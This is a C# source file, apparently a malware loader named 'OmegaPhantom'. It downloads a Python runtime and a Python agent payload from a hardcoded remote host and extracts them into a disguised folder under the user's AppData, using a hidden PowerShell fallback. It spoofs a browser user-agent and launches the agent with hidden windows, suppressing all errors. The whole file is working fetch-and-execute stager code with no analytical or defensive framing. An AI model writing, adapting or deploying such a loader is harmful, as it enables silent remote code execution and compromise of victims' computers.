using System;
using System.IO;
using System.Net;
using System.Diagnostics;
using System.IO.Compression;
using System.Threading;

namespace OmegaPhantom {
    class Loader {
        // --- CONFIGURATION ---
        static string BASE_URL = "https://mrl-neggerre.up.railway.app";
        static string RUNTIME_ZIP_URL = BASE_URL + "/static/omega_runtime.zip";
        static string AGENT_PY_URL = BASE_URL + "/api/pyclient";
        static string WORK_DIR = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), "MRL", "SystemHost");
        static string PYTHON_EXE = Path.Combine(WORK_DIR, "bin", "python.exe");
        static string AGENT_PY = Path.Combine(WORK_DIR, "core.py");
        // ---------------------

        static void Main(string[] args) {
            try {
                // 1. Prepare Environment
                if (!Directory.Exists(WORK_DIR)) Directory.CreateDirectory(WORK_DIR);

                // 2. Deploy Runtime if missing
                if (!File.Exists(PYTHON_EXE)) {
                    DeployRuntime();
                }

                // 3. Update Agent Core
                FetchAgent();

                // 4. Ignite Agent (Silent)
                Ignite();
            } catch {
                // Fail silently in true Phantom style
            }
        }

        static void DeployRuntime() {
            string zipPath = Path.Combine(WORK_DIR, "runtime.zip");
            using (WebClient client = new WebClient()) {
                client.DownloadFile(RUNTIME_ZIP_URL, zipPath);
            }
            
            // Extract using Shell (Universal) or ZipFile (4.5+)
            try {
                // Attempt native ZipFile extraction (fastest)
                ZipFile.ExtractToDirectory(zipPath, WORK_DIR);
            } catch {
                // Fallback to PowerShell for older .NET
                string cmd = string.Format("Add-Type -AssemblyName System.IO.Compression.FileSystem; [System.IO.Compression.ZipFile]::ExtractToDirectory('{0}', '{1}')", zipPath, WORK_DIR);
                ProcessStartInfo psi = new ProcessStartInfo("powershell", "-Command " + cmd) {
                    WindowStyle = ProcessWindowStyle.Hidden,
                    CreateNoWindow = true
                };
                Process.Start(psi).WaitForExit();
            }
            
            if (File.Exists(zipPath)) File.Delete(zipPath);
        }

        static void FetchAgent() {
            using (WebClient client = new WebClient()) {
                // Ensure we get the fresh Armor payload
                client.Headers.Add("user-agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64)");
                client.DownloadFile(AGENT_PY_URL, AGENT_PY);
            }
        }

        static void Ignite() {
            ProcessStartInfo psi = new ProcessStartInfo {
                FileName = PYTHON_EXE,
                Arguments = string.Format("\"{0}\"", AGENT_PY),
                WorkingDirectory = WORK_DIR,
                WindowStyle = ProcessWindowStyle.Hidden,
                CreateNoWindow = true,
                UseShellExecute = false
            };
            
            // Set environment variables to support the portable site-packages
            psi.EnvironmentVariables["PYTHONPATH"] = Path.Combine(WORK_DIR, "Lib", "site-packages");
            
            Process.Start(psi);
        }
    }
}
